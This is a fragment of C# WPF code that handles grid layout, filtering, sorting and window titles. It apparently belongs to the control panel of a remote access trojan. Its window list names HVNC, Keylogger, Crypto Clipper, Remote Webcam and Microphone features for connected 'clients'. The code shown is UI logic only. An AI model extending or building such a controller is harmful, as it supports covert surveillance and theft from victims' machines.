        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
        {
            ApplyAdaptiveAllClientsWidths();
            UpdateSettingsCheckboxStates();
        });
    }

    private void ChkFilterWebcam_Checked(object sender, RoutedEventArgs e)
    {
        _webcamFilterOnly = true;
        RefreshClientFilters();
    }

    private void ChkFilterWebcam_Unchecked(object sender, RoutedEventArgs e)
    {
        _webcamFilterOnly = false;
        RefreshClientFilters();
    }

    private void ChkFilterAdmin_Checked(object sender, RoutedEventArgs e)
    {
        _adminFilterOnly = true;
        RefreshClientFilters();
    }

    private void ChkFilterAdmin_Unchecked(object sender, RoutedEventArgs e)
    {
        _adminFilterOnly = false;
        RefreshClientFilters();
    }

    private void ChkAutoFill_Checked(object sender, RoutedEventArgs e)
    {
        if (_suppressCheckboxUpdate) return;
        _autoFitColumns = true;
        UiPrefs.Set("AutoFitColumns", 1);
        FitColumnsToContent(GridClients);
        FitColumnsToContent(GridAllClients);
    }

    private void FitColumnsToContent(System.Windows.Controls.DataGrid grid)
    {
        if (grid == null) return;
        _suppressColumnSave = true;
        foreach (var col in grid.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;
            col.Width = new DataGridLength(1, DataGridLengthUnitType.Auto);
        }
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
        {
            foreach (var col in grid.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key) || key == "TAG") continue;
                double w = col.ActualWidth;
                col.Width = new DataGridLength(w > 20 ? w : Math.Max(col.MinWidth, 60));
            }
            _suppressColumnSave = false;
        });
    }

    private void ChkAutoFill_Unchecked(object sender, RoutedEventArgs e)
    {
        if (_suppressCheckboxUpdate) return;
        _autoFitColumns = false;
        UiPrefs.Set("AutoFitColumns", 0);
    }

    private void ResetGridSettings_Click(object sender, RoutedEventArgs e)
    {
        // Change detection: compare current widths against the scale-adjusted defaults for
        // the current window width so Reset is a no-op only when nothing has changed.
        bool hasChanges = _webcamFilterOnly
            || _adminFilterOnly
            || _autoFitColumns
            || (TxtSearch != null && !string.IsNullOrEmpty(TxtSearch.Text));

        if (!hasChanges)
        {
            double gw = GridClients.ActualWidth;
            if (gw >= 50)
            {
                double avail = gw - 8.0 - 60.0;
                const double kF = 1546.0, kM = 1077.0;
                double t = avail >= kF ? 1.0 : avail >= kM ? (avail - kM) / (kF - kM) : 0.0;
                foreach (var col in GridClients.Columns)
                {
                    if (col.Visibility != Visibility.Visible) { hasChanges = true; break; }
                    string h = GetOriginalKey(col);
                    if (string.IsNullOrEmpty(h) || h == "TAG") continue;
                    if (_onlineColSpec.TryGetValue(h, out var spec))
                    {
                        int ep = (int)Math.Round(spec.min + (spec.full - spec.min) * t);
                        if (col.Width.UnitType != DataGridLengthUnitType.Pixel || Math.Abs(col.Width.Value - ep) > 2.0)
                        { hasChanges = true; break; }
                    }
                }
            }
            else { hasChanges = true; }
        }

        if (!hasChanges) return;

        _webcamFilterOnly = false;
        _adminFilterOnly = false;
        if (TxtSearch != null) TxtSearch.Text = "";

        // Reset auto-fit — default is off.
        _autoFitColumns = false;
        UiPrefs.Set("AutoFitColumns", 0);

        // Restore visibility before applying widths.
        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (!string.IsNullOrEmpty(key)) { col.Visibility = Visibility.Visible; UiPrefs.Set($"ColVis_{key}", 1); }
            }
        }
        finally { _suppressColumnSave = false; }

        // Defer width + checkbox sync to Background so WPF processes the visibility changes
        // in a separate layout pass first — prevents column header separator rendering artifacts.
        Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
        {
            ApplyAdaptiveOnlineWidths();
            UpdateSettingsCheckboxStates();
        });
        RefreshClientFilters();
    }

    // Interpolates each column between its min and full width based on available grid space.
    // kFull=1546 (sum of full widths), kMin=1077 (sum of minimum readable widths, all languages).
    // Below kMin: use per-column minimums (scrollbar visible). Above kFull: use full defaults.
    private void ApplyAdaptiveOnlineWidths()
    {
        double gridWidth = GridClients.ActualWidth;
        if (gridWidth < 50) return;
        double avail = gridWidth - 8.0 - 60.0; // scrollbar (8) + TAG MinWidth reserve (60)
        const double kFull = 1546.0, kMin = 1077.0;
        double t = avail >= kFull ? 1.0 : avail >= kMin ? (avail - kMin) / (kFull - kMin) : 0.0;

        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key)) continue;
                if (key == "TAG") { col.Width = new DataGridLength(1, DataGridLengthUnitType.Star); continue; }
                if (!_onlineColSpec.TryGetValue(key, out var spec)) continue;
                int px = (int)Math.Round(spec.min + (spec.full - spec.min) * t);
                col.Width = new DataGridLength(px);
                UiPrefs.Set($"ColWidth_{key}", px);
            }
        }
        finally { _suppressColumnSave = false; }
    }

    // Same adaptive interpolation for All Clients DataGrid.
    // kFull=1004, kMin=763 → fits without scrollbar from ~831 px grid width.
    private void ApplyAdaptiveAllClientsWidths()
    {
        if (GridAllClients == null) return;
        double gridWidth = GridAllClients.ActualWidth;
        if (gridWidth < 50) return;
        double avail = gridWidth - 8.0 - 60.0;
        const double kFull = 1004.0, kMin = 763.0;
        double t = avail >= kFull ? 1.0 : avail >= kMin ? (avail - kMin) / (kFull - kMin) : 0.0;

        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridAllClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key)) continue;
                if (key == "TAG") { col.Width = new DataGridLength(1, DataGridLengthUnitType.Star); continue; }
                if (!_allClientsColSpec.TryGetValue(key, out var spec)) continue;
                int px = (int)Math.Round(spec.min + (spec.full - spec.min) * t);
                col.Width = new DataGridLength(px);
                UiPrefs.Set($"AllColWidth_{key}", px);
            }
        }
        finally { _suppressColumnSave = false; }
    }

    // Sets all online columns to their full (t=1.0) defaults without measuring ActualWidth.
    // Used synchronously on maximize so the first rendered frame already has correct widths.
    private void ApplyFullOnlineWidths()
    {
        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key)) continue;
                if (key == "TAG") { col.Width = new DataGridLength(1, DataGridLengthUnitType.Star); continue; }
                if (!_onlineColSpec.TryGetValue(key, out var spec)) continue;
                col.Width = new DataGridLength(spec.full);
                UiPrefs.Set($"ColWidth_{key}", spec.full);
            }
        }
        finally { _suppressColumnSave = false; }
    }

    private void ApplyFullAllClientsWidths()
    {
        if (GridAllClients == null) return;
        _suppressColumnSave = true;
        try
        {
            foreach (var col in GridAllClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key)) continue;
                if (key == "TAG") { col.Width = new DataGridLength(1, DataGridLengthUnitType.Star); continue; }
                if (!_allClientsColSpec.TryGetValue(key, out var spec)) continue;
                col.Width = new DataGridLength(spec.full);
                UiPrefs.Set($"AllColWidth_{key}", spec.full);
            }
        }
        finally { _suppressColumnSave = false; }
    }

    private static double ComputeAdaptiveT(double gridWidth, double kFull, double kMin)
    {
        if (gridWidth < 50) return 0.0;
        double avail = gridWidth - 8.0 - 60.0;
        return avail >= kFull ? 1.0 : avail >= kMin ? (avail - kMin) / (kFull - kMin) : 0.0;
    }

    // Builds a list of (column, fromWidth, toWidth, isOnline) for the animation.
    // tOnline / tAll are the target interpolation values [0,1].
    private List<(DataGridColumn col, double from, double to, bool isOnline)> BuildTransitionTargets(
        double tOnline, double tAll)
    {
        var list = new List<(DataGridColumn, double, double, bool)>();

        foreach (var col in GridClients.Columns)
        {
            string key = GetOriginalKey(col);
            if (string.IsNullOrEmpty(key) || key == "TAG") continue;
            if (!_onlineColSpec.TryGetValue(key, out var spec)) continue;
            double from = col.Width.UnitType == DataGridLengthUnitType.Pixel ? col.Width.Value : spec.min;
            double to   = spec.min + (spec.full - spec.min) * tOnline;
            list.Add((col, from, to, true));
        }

        if (GridAllClients != null)
        {
            foreach (var col in GridAllClients.Columns)
            {
                string key = GetOriginalKey(col);
                if (string.IsNullOrEmpty(key) || key == "TAG") continue;
                if (!_allClientsColSpec.TryGetValue(key, out var spec)) continue;
                double from = col.Width.UnitType == DataGridLengthUnitType.Pixel ? col.Width.Value : spec.min;
                double to   = spec.min + (spec.full - spec.min) * tAll;
                list.Add((col, from, to, false));
            }
        }

        return list;
    }

    private void BeginColumnTransition(List<(DataGridColumn col, double from, double to, bool isOnline)> targets)
    {
        _colAnimTimer?.Stop();
        _colAnimList  = targets;
        _colAnimStart = DateTime.UtcNow;
        _colAnimTimer = new System.Windows.Threading.DispatcherTimer(
            System.Windows.Threading.DispatcherPriority.Normal)
        {
            Interval = TimeSpan.FromMilliseconds(16)
        };
        _colAnimTimer.Tick += ColAnim_Tick;
        _colAnimTimer.Start();
    }

    private void ColAnim_Tick(object? sender, EventArgs e)
    {
        double elapsed = (DateTime.UtcNow - _colAnimStart).TotalMilliseconds;
        double raw = Math.Min(elapsed / ColAnimMs, 1.0);
        double t   = ColEase(raw);

        _suppressColumnSave = true;
        try
        {
            foreach (var (col, from, to, _) in _colAnimList!)
                col.Width = new DataGridLength((int)Math.Round(from + (to - from) * t));
        }
        finally { _suppressColumnSave = false; }

        if (raw >= 1.0)
        {
            _colAnimTimer?.Stop();
            _colAnimTimer = null;

            // Persist final widths so they survive app restarts.
            _suppressColumnSave = true;
            try
            {
                foreach (var (col, _, to, isOnline) in _colAnimList!)
                {
                    string key = GetOriginalKey(col);
                    if (string.IsNullOrEmpty(key) || key == "TAG") continue;
                    int px = (int)Math.Round(to);
                    if (isOnline) UiPrefs.Set($"ColWidth_{key}", px);
                    else          UiPrefs.Set($"AllColWidth_{key}", px);
                }
            }
            finally { _suppressColumnSave = false; }
        }
    }

    private void RefreshClientFilters()
    {
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
        view?.Refresh();
    }

    private void GridClients_Sorting(object sender, DataGridSortingEventArgs e)
    {
        e.Handled = true;
        var column = e.Column;
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
        if (view == null) return;

        var direction = (column.SortDirection != System.ComponentModel.ListSortDirection.Ascending)
            ? System.ComponentModel.ListSortDirection.Ascending
            : System.ComponentModel.ListSortDirection.Descending;
        column.SortDirection = direction;

        view.SortDescriptions.Clear();
        // Always sort HasTag Descending first!
        view.SortDescriptions.Add(new System.ComponentModel.SortDescription(nameof(ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));

        string sortPath = column.SortMemberPath;
        if (string.IsNullOrEmpty(sortPath) && column is DataGridBoundColumn boundCol && boundCol.Binding is System.Windows.Data.Binding binding)
        {
            sortPath = binding.Path.Path;
        }

        if (!string.IsNullOrEmpty(sortPath))
        {
            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
        }
    }

    private void GridAllClients_Sorting(object sender, DataGridSortingEventArgs e)
    {
        e.Handled = true;
        var column = e.Column;
        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridAllClients.ItemsSource);
        if (view == null) return;

        var direction = (column.SortDirection != System.ComponentModel.ListSortDirection.Ascending)
            ? System.ComponentModel.ListSortDirection.Ascending
            : System.ComponentModel.ListSortDirection.Descending;
        column.SortDirection = direction;

        view.SortDescriptions.Clear();
        view.SortDescriptions.Add(new System.ComponentModel.SortDescription(
            nameof(Data.ClientRecord.HasTag), System.ComponentModel.ListSortDirection.Descending));

        string sortPath = column.SortMemberPath;
        if (string.IsNullOrEmpty(sortPath) && column is DataGridBoundColumn boundCol && boundCol.Binding is System.Windows.Data.Binding binding)
            sortPath = binding.Path.Path;

        if (!string.IsNullOrEmpty(sortPath))
            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
    }

    private void UpdateOpenWindowTitlesAndLabels(string clientId, string tag)
    {
        var prefix = $"{clientId}:";
        foreach (var kvp in _featureWindows.ToList())
        {
            if (kvp.Key.StartsWith(prefix))
            {
                var win = kvp.Value;
                Dispatcher.BeginInvoke(() =>
                {
                    try
                    {
                        string friendly = GetFriendlyWindowName(win);
                        win.Title = string.IsNullOrEmpty(tag)
                            ? $"{friendly} — {clientId}"
                            : $"{friendly} — {tag} ({clientId})";

                        if (win.FindName("TxtTitle") is TextBlock tbTitle)
                        {
                            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
                        }
                        else if (win.FindName("TxtClientId") is TextBlock tbClient)
                        {
                            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
                        }
                    }
                    catch { }
                });
            }
        }
    }

    private string GetFriendlyWindowName(Window win)
    {
        return win.GetType().Name switch
        {
            "RemoteDesktopWindow" => "Remote Desktop",
            "WebcamWindow" => "Remote Webcam",
            "HvncWindow" => "HVNC",
            "FileManagerWindow" => "File Manager",
            "ProcessManagerWindow" => "Process Manager",
            "TcpManagerWindow" => "TCP Connections",
            "StartupManagerWindow" => "Startup Manager",
            "MicrophoneWindow" => "Microphone",
            "FunWindow" => "Fun Panel",
            "Socks5Window" => "SOCKS5 Proxy",
            "ServiceManagerWindow" => "Service Manager",
            "WindowManagerWindow" => "Window Manager",
            "RegistryEditorWindow" => "Registry Editor",
            "InstalledAppsWindow" => "Installed Programs",
            "DeviceManagerWindow" => "Device Manager",
            "PerformanceMonitorWindow" => "Performance Monitor",
            "KeyloggerWindow" => "Keylogger",
            "CryptoClipperWindow" => "Crypto Clipper",
            _ => win.Title
        };
    }
}
